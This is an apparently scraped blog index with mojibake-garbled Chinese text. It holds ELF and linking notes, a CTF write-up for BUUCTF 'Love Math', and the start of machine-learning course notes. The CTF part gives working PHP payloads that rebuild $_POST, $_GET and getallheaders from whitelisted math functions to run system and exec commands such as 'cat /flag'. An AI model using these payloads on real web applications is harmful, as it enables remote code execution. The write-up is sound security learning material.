Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF headerç»“æ„ä½“å¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†"><a href="#æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†" class="headerlink" title="æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†"></a>æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// å…¨å±€static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// å£°æ˜å…¨å±€å˜é‡</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// å£°æ˜å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡nmå‘½ä»¤æ¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·ï¼Œä»å·¦åˆ°å³åˆ†åˆ«æ˜¯å˜é‡çš„ç›¸å¯¹åœ°å€ï¼Œå˜é‡æ‰€åœ¨æ®µçš„åå­—å’Œå˜é‡åå­—ã€‚<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>å…¶ä¸­a.1922æ˜¯ç¼–è¯‘å™¨ä¿®æ”¹å˜é‡åå­—çš„ç»“æœï¼Œå› ä¸ºaæ˜¯ä¸€ä¸ªå±€éƒ¨é™æ€å˜é‡ï¼Œä½œç”¨åŸŸåœ¨ä»–çš„å‡½æ•°ä½“ä¸­ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬åœ¨ä¸åŒçš„å‡½æ•°ä½“ä¸­å£°æ˜ç›¸åŒåå­—çš„å±€éƒ¨é™æ€å˜é‡ï¼ˆè¿™ç§æ“ä½œæ˜¯è¢«å…è®¸çš„ï¼‰è€Œä¸”å…¶ç”Ÿå‘½å‘¨æœŸä¸ºæ•´ä¸ªç¨‹åºæ‰§è¡Œæ—¶ï¼Œç¼–è¯‘å™¨ä¸ºäº†æ”¯æŒè¿™ç§åŠŸèƒ½ï¼Œæ‰€ä»¥æ¥åŠ åç¼€æ¥æ ‡è¯†ä¸åŒçš„å±€éƒ¨é™æ€å˜é‡ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨objdumpæ¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„ç»“æ„ï¼Œ-hå‚æ•°å¯æŸ¥çœ‹å„ä¸ªæ®µçš„åŸºæœ¬ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Sizeè¡¨ç¤ºæ®µé•¿åº¦<br>File offè¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­çš„åç§»<br>æ¯ä¸ªæ®µç¬¬äºŒè¡Œä¸­çš„â€CONTENTSâ€ â€œALLOCâ€ç­‰è¡¨ç¤ºæ®µçš„å±æ€§ï¼Œâ€CONTENTSâ€è¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­å­˜åœ¨<br>æ¯”å¦‚æ•°æ®æ®µçš„å¤§å°ä¸º0xcå­—èŠ‚å¤§å°ï¼Œå› ä¸ºæœ‰ä¸‰ä¸ªå››å­—èŠ‚çš„å˜é‡åˆ†åˆ«ä¸ºglobalA,globalCå’Œa</p><h2 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h2><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥å®Œæˆé“¾æ¥è¿‡ç¨‹<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>å¯ä»¥çœ‹åˆ°ä¹‹å‰çš„ä¸€äº›ç›¸å¯¹åœ°å€å…¨éƒ¨å˜ä¸ºäº†ç»å¯¹åœ°å€ï¼Œå®Œæˆäº†åœ°å€é‡å®šä½</p><h2 id="è£…è½½è¿è¡Œ"><a href="#è£…è½½è¿è¡Œ" class="headerlink" title="è£…è½½è¿è¡Œ"></a>è£…è½½è¿è¡Œ</h2><p>å½“ç¨‹åºåŠ è½½è¿›å†…å­˜ç¨‹åºå³å¯è¿è¡Œï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬ä¸å¾—ä¸æåˆ°è™šæ‹Ÿå†…å­˜ï¼ŒåŠ¨æ€é“¾æ¥åº“å’Œå‡½æ•°æ‰§è¡Œçš„é—®é¢˜ã€‚æˆ‘ä»¬ç»™å‡ºç¨‹åºæ‰§è¡Œçš„é¡ºåºï¼Œå…·ä½“æ¢ç©¶æˆ‘ä»¬ç­‰åˆ°ä¹‹åçš„æ–‡ç« å†å¦è¡Œåˆ†æã€‚</p><blockquote><p>  1.é¦–å…ˆ bash è¿›è¡Œ fork ç³»ç»Ÿè°ƒç”¨ï¼Œç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ¥ç€åœ¨å­è¿›ç¨‹ä¸­è¿è¡Œ execve å‡½æ•°æŒ‡å®šçš„ elf äºŒè¿›åˆ¶ç¨‹åºï¼ˆ Linuxä¸­æ‰§è¡ŒäºŒè¿›åˆ¶ç¨‹åºæœ€ç»ˆéƒ½æ˜¯é€šè¿‡ execve è¿™ä¸ªåº“å‡½æ•°è¿›è¡Œçš„ï¼‰ï¼Œexecve ä¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨æŠŠ elf æ–‡ä»¶ load åˆ°å†…å­˜ä¸­çš„ä»£ç æ®µ(_text)ä¸­ã€‚<br>2.å¦‚æœæœ‰ä¾èµ–çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¼šè°ƒç”¨åŠ¨æ€é“¾æ¥å™¨è¿›è¡Œåº“æ–‡ä»¶çš„åœ°å€æ˜ å°„ï¼ŒåŠ¨æ€é“¾æ¥åº“çš„å†…å­˜ç©ºé—´æ˜¯è¢«å¤šä¸ªè¿›ç¨‹å…±äº«çš„ã€‚<br>3.å†…æ ¸ä» elf æ–‡ä»¶å¤´å¾—åˆ°_startçš„åœ°å€ï¼Œè°ƒåº¦æ‰§è¡Œæµä»_startæŒ‡å‘çš„åœ°å€å¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œæµåœ¨_startæ‰§è¡Œçš„ä»£ç æ®µä¸­è·³è½¬åˆ°libcä¸­çš„å…¬å…±åˆå§‹åŒ–ä»£ç æ®µ<strong>libc_start_mainï¼Œè¿›è¡Œç¨‹åºè¿è¡Œå‰çš„åˆå§‹åŒ–å·¥ä½œã€‚<br>4.</strong>libc_start_mainçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šè·³è½¬åˆ°_initä¸­å…¨å±€å˜é‡çš„åˆå§‹åŒ–å·¥ä½œï¼Œéšåè°ƒç”¨æˆ‘ä»¬çš„mainå‡½æ•°ï¼Œè¿›å…¥åˆ°ä¸»å‡½æ•°çš„æŒ‡ä»¤æµç¨‹ã€‚</p></blockquote><h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><ul><li>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> äºŒè¿›åˆ¶ </tag>
            
            <tag> ç¨‹åºä¸æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 åˆèµ›] Love Math-æ€»ç»“æ•°å­¦ä¸­çš„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><ul><li>å¼€å±€ç»™äº†æºç  æ‹¿åˆ°æœ¬åœ°åˆ†æä¸€ä¸‹<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>ç™½åå•åªç»™äº†ä¸€å †æ•°å­¦å‡½æ•°<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>ä»é‡Œé¢æ‰¾å‡ºæ¥èƒ½å¤Ÿåˆ©ç”¨çš„æ‹¼å‡‘å‡ºå‘½ä»¤æ‰§è¡Œ</p><p>æœ€ç»ˆè‚¯å®šå¸Œæœ›èƒ½å¤Ÿè¾¾æˆè¿™æ ·çš„ç»“æœ<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>æ‰€ä»¥éš¾ç‚¹åœ¨äºå¦‚ä½•åˆ©ç”¨å·²çŸ¥å‡½æ•°æ¥æ‹¼å‡‘å‡º$_POST</p><h3 id="å‡ ä¸ªå‡½æ•°"><a href="#å‡ ä¸ªå‡½æ•°" class="headerlink" title="å‡ ä¸ªå‡½æ•°"></a>å‡ ä¸ªå‡½æ•°</h3><ol><li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li><li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ï¼Œæœ€é«˜ä¸º36è¿›åˆ¶</li><li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li></ol><p>åˆ©ç”¨base_convertå‡‘å‡ºæ¥hex2bin,å†åˆ©ç”¨hex2binå‡‘å‡ºæ¥_POST,æœ€åç”¨å¯å˜å˜é‡å®Œæˆå‘½ä»¤æ‰§è¡Œ</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// è½¬æˆ_POSTå­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶</span></span><br><span class="line"></span><br><span class="line">ä»¥ä¸Šä¸¤ä¸ªè¯­å¥åˆèµ·æ¥ä¸º <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// ä¸­æ‹¬å·è¢«ban,ç”¨å¤§æ‹¬å·æ¥ç»•è¿‡</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="å…¶ä»–payload"><a href="#å…¶ä»–payload" class="headerlink" title="å…¶ä»–payload"></a>å…¶ä»–payload</h2><h3 id="getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"><a href="#getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"></a>getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// é€šè¿‡getæ–¹æ³•ä¼ å…¥å‚æ•°å®Œæˆå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"><a href="#headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"></a>headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">å³ exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‡ ç‚¹è¯´æ˜</p><p>getallheaders â€” è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>å½“å–æ•°ç»„å…ƒç´ æ—¶ï¼Œç”¨å¤§æ‹¬å·ä¼šæŠ›å‡ºè­¦å‘Šè€Œä¸æ˜¯é”™è¯¯</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>ç”¨ä¸Šè¿°payload åŠ ä¸Š postmanæ”¹ä¸‹headerså³å¯å‘½ä»¤æ‰§è¡Œgetflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ"><a href="#å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ"></a>å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>å‘ç°ä¿©èƒ½ç”¨çš„</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google newsï¼šèšç±»ç®—æ³•ï¼Œæ— ç›‘ç£å­¦ä¹ ç®—æ³•</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>èšç±»ç®—æ³•æ˜¯unsupervised learningçš„ä¸€ç§</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-æ¨¡å‹æè¿°"><a href="#2-1-æ¨¡å‹æè¿°" class="headerlink" title="2-1.æ¨¡å‹æè¿°"></a>2-1.æ¨¡å‹æè¿°</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>æ ¹æ®æ‹ŸåˆçŠ¶å†µé¢„ä¼°æˆ¿ä»·ï¼Œæ˜¯ä¸€ä¸ªsupervised learning problemï¼Œå› ä¸ºæ¯ä¸€ä¸ªå¤§å°éƒ½æœ‰ä¸€ä¸ªâ€œæ­£ç¡®çš„ç­”æ¡ˆâ€ï¼Œå¹¶ä¸”è¿˜æ˜¯å›å½’é—®é¢˜ã€‚</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = â€œinputâ€ variable / features</li><li><p>y = â€œoutputâ€ variable / â€œtargetâ€ variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means â€œindexâ€)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear 